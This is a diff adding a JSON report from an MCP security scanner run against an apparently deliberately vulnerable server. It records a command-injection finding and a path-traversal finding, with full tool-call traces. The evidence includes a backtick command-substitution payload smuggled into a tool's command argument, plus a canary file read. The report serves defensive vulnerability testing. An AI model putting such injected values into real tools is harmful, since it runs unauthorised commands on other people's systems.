@@ -1,0 +1,207 @@
+{
+  "target": "DVMCP-c8",
+  "passed": false,
+  "highest_severity": "CRITICAL",
+  "summary": {
+    "total_scenarios": 2,
+    "vulnerabilities": 2
+  },
+  "findings": [
+    {
+      "attack_id": "mcp-command-injection",
+      "attack_name": "OS Command Injection",
+      "scenario_label": "mcp-command-injection:execute_shell_command",
+      "vector": null,
+      "tool": "execute_shell_command",
+      "category": {
+        "key": "mcp_command_injection",
+        "title": "OS Command Injection",
+        "owasp_id": "MCP05",
+        "owasp_label": "OWASP MCP05 \u2014 OS Command Injection",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.97,
+      "rationale": "An injected shell expression executed on the host: 4191022*8032479 resolved to 33664296203538 in the tool output. This is OS command execution.",
+      "evidence": [
+        "Payload: command='`echo $((4191022*8032479))`'",
+        "Shell evaluated 4191022*8032479 \u2192 33664296203538 (proof of execution): Error executing command: /bin/sh: 1: 33664296203538: not found"
+      ],
+      "tool_calls": [
+        {
+          "name": "execute_shell_command",
+          "arguments": {
+            "command": "`echo $((4191022*8032479))`"
+          },
+          "output": "Error executing command: /bin/sh: 1: 33664296203538: not found"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "execute_shell_command",
+          "schema_sha256": "fc947ad9f74bb3b92b564d3665a163a0723c7f818ba2ad25b7519fd56cd9f277"
+        },
+        "sigma": {
+          "target_path": [
+            "command"
+          ],
+          "arguments": {
+            "command": "`echo $((4191022*8032479))`"
+          }
+        },
+        "payload": {
+          "class": "cmd-arith",
+          "text": "`echo $((4191022*8032479))`"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3744.010095,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 12,
+              "method": "tools/call",
+              "params": {
+                "name": "execute_shell_command",
+                "arguments": {
+                  "command": "`echo $((4191022*8032479))`"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3744.014146,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 12,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "Error executing command: /bin/sh: 1: 33664296203538: not found\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "Error executing command: /bin/sh: 1: 33664296203538: not found\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "arith",
+          "soundness": "deterministic",
+          "a": 4191022,
+          "b": 8032479,
+          "product": 33664296203538
+        },
+        "session_sha256": "06f373d2e2b2d83ed6b828a7bd27e6288c3d2186e5ca160334be0cf261d6b5b9"
+      }
+    },
+    {
+      "attack_id": "mcp-path-traversal",
+      "attack_name": "Path Traversal / Unsandboxed File Read",
+      "scenario_label": "mcp-path-traversal:analyze_log_file",
+      "vector": null,
+      "tool": "analyze_log_file",
+      "category": {
+        "key": "mcp_path_traversal",
+        "title": "Path Traversal / Unsandboxed File Access",
+        "owasp_id": null,
+        "owasp_label": "Path Traversal / Unsandboxed File Access (not MCP-specific \u2014 see category description)",
+        "owasp_verified": true,
+        "nist_refs": [
+          "NIST AI 100-2 (Adversarial ML taxonomy, Mar 2025 agent update): Excessive Agency"
+        ]
+      },
+      "success": true,
+      "severity": "CRITICAL",
+      "confidence": 0.99,
+      "rationale": "The tool returned the contents of a file outside any intended directory \u2014 path traversal / missing sandboxing (proven read).",
+      "evidence": [
+        "Payload: log_path='/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary'",
+        "Observed the unpredictable canary value written by the scanner",
+        "Leaked content: Log File Analysis: /tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary \u23ce -------------------------- \u23ce Lines: 1 \u23ce Words: 1 \u23ce Characters: 35 \u23ce  \u23ce Sample Content (first 500 characters): \u23ce RCX8fc2d647efe424c226cec5e2ea7439cd... \u23ce  \u23ce Analysis \u2026"
+      ],
+      "tool_calls": [
+        {
+          "name": "analyze_log_file",
+          "arguments": {
+            "log_path": "/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary"
+          },
+          "output": "Log File Analysis: /tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary \u23ce -------------------------- \u23ce Lines: 1 \u23ce Words: 1 \u23ce Characters: 35 \u23ce  \u23ce Sample Content (first 500 characters): \u23ce RCX8fc2d647efe424c226cec5e2ea7439cd... \u23ce  \u23ce Analysis \u2026"
+        }
+      ],
+      "witness": {
+        "version": 1,
+        "tool": {
+          "name": "analyze_log_file",
+          "schema_sha256": "8a833a9a9363077de802af70ccdd1bdcb667ff1362555a6ac4128f10c349dad5"
+        },
+        "sigma": {
+          "target_path": [
+            "log_path"
+          ],
+          "arguments": {
+            "log_path": "/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary"
+          }
+        },
+        "payload": {
+          "class": "path-traversal",
+          "text": "/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary"
+        },
+        "trace": [
+          {
+            "dir": "out",
+            "t": 3744.018671,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 14,
+              "method": "tools/call",
+              "params": {
+                "name": "analyze_log_file",
+                "arguments": {
+                  "log_path": "/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary"
+                }
+              }
+            }
+          },
+          {
+            "dir": "in",
+            "t": 3744.021751,
+            "msg": {
+              "jsonrpc": "2.0",
+              "id": 14,
+              "result": {
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "\nLog File Analysis: /tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary\n--------------------------\nLines: 1\nWords: 1\nCharacters: 35\n\nSample Content (first 500 characters):\nRCX8fc2d647efe424c226cec5e2ea7439cd...\n\nAnalysis Complete.\n"
+                  }
+                ],
+                "structuredContent": {
+                  "result": "\nLog File Analysis: /tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary\n--------------------------\nLines: 1\nWords: 1\nCharacters: 35\n\nSample Content (first 500 characters):\nRCX8fc2d647efe424c226cec5e2ea7439cd...\n\nAnalysis Complete.\n"
+                },
+                "isError": false
+              }
+            }
+          }
+        ],
+        "oracle": {
+          "type": "canary",
+          "soundness": "deterministic",
+          "canary": "RCX8fc2d647efe424c226cec5e2ea7439cd",
+          "canary_path": "/tmp/redcell-canary-rire6bg2/.redcell-f83f389c.canary"
+        },
+        "session_sha256": "1c5924026abc9b22092f1292b6a14ca6a32dadfed4244a07565674ac1a080a2b"
+      }
+    }
+  ]
+}
